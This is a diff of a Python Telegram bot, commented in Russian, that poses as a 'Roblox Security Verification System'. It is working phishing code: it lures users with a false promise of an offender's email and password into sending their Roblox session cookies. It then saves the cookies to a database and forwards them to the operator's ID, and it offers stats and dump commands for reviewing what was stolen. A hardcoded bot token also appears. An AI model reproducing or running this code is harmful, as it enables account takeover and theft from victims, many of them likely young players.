@@ -6,11 +6,11 @@ from flask import Flask
 from telegram import Update, InputFile
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
-# ТОКЕН И ID
+# ТОКЕН И ID (ОБНОВЛЕНО)
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8972754736:AAHoFicLaYc4Kca1_5xPJqzy8mUsj7k-q0k')
-YOUR_ID = int(os.environ.get('YOUR_ID', 8972754736))
+YOUR_ID = int(os.environ.get('YOUR_ID', 8205534130))  # НОВЫЙ ID
 
-# Flask для пинга (чтобы Render не засыпал)
+# Flask для пинга
 app_flask = Flask(__name__)
 @app_flask.route('/')
 def ping():
@@ -19,7 +19,7 @@ def ping():
 def run_flask():
     app_flask.run(host='0.0.0.0', port=10000)
 
-# Путь к видео (файл лежит в папке video/)
+# Путь к видео
 VIDEO_PATH = "video/instruction.mp4"
 
 # БД
@@ -33,7 +33,7 @@ def init_db():
     conn.close()
 init_db()
 
-# /start — видео + текст
+# /start
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     caption = (
         "🔐 Roblox Security Verification System\n\n"
@@ -45,7 +45,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "Доступ будет открыт на 3 дня без верификации."
     )
     
-    # Отправка видео из локальной папки
     with open(VIDEO_PATH, 'rb') as video_file:
         await update.message.reply_video(
             video=InputFile(video_file),
@@ -62,7 +61,6 @@ async def handle_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Неверный формат. Отправьте корректную куки.")
         return
     
-    # Сохраняем в БД
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute("INSERT INTO logs (user_id, username, cookie, timestamp) VALUES (?, ?, ?, ?)",
@@ -70,20 +68,19 @@ async def handle_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
     conn.commit()
     conn.close()
     
-    # Ответ жертве
     await update.message.reply_text(
         "✅ Куки приняты.\n"
         "⏳ Ожидайте. Через 1 час придёт почта и пароль аккаунта обидчика.\n"
         "🔓 Доступ без верификации будет активен 3 дня."
     )
     
-    # Пересылка тебе
+    # Пересылка тебе на НОВЫЙ ID
     await context.bot.send_message(
         chat_id=YOUR_ID,
         text=f"📩 НОВАЯ КУКИ:\n\n{cookie_text}\n\n👤 Юзер: @{user.username or 'нет'}\n🆔 ID: {user.id}\n🕒 Время: {datetime.datetime.now()}"
     )
 
-# Статистика для тебя
+# Статистика
 async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != YOUR_ID:
         await update.message.reply_text("❌ Доступ запрещён.")
@@ -97,7 +94,7 @@ async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     conn.close()
     await update.message.reply_text(f"📊 Статистика:\nВсего куки: {total}\nСегодня: {today}")
 
-# Дамп для тебя
+# Дамп
 async def dump(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != YOUR_ID:
         await update.message.reply_text("❌ Доступ запрещён.")
@@ -115,7 +112,7 @@ async def dump(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text += f"👤 {row[1]} ({row[0]})\n🍪 {row[2][:50]}...\n🕒 {row[3]}\n\n"
     await update.message.reply_text(text[:4000])
 
-# Команда для получения file_id (если нужно)
+# Получить file_id
 async def getfile(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != YOUR_ID:
         await update.message.reply_text("❌ Доступ запрещён.")
@@ -126,17 +123,13 @@ async def getfile(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"✅ file_id:\n`{update.message.video.file_id}`", parse_mode='Markdown')
 
 def main():
-    # Запуск Flask для пинга
     threading.Thread(target=run_flask, daemon=True).start()
-    
-    # Запуск бота
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("stats", stats))
     app.add_handler(CommandHandler("dump", dump))
     app.add_handler(CommandHandler("getfile", getfile))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie))
-    
     print("Бот запущен на Render...")
     app.run_polling()
 
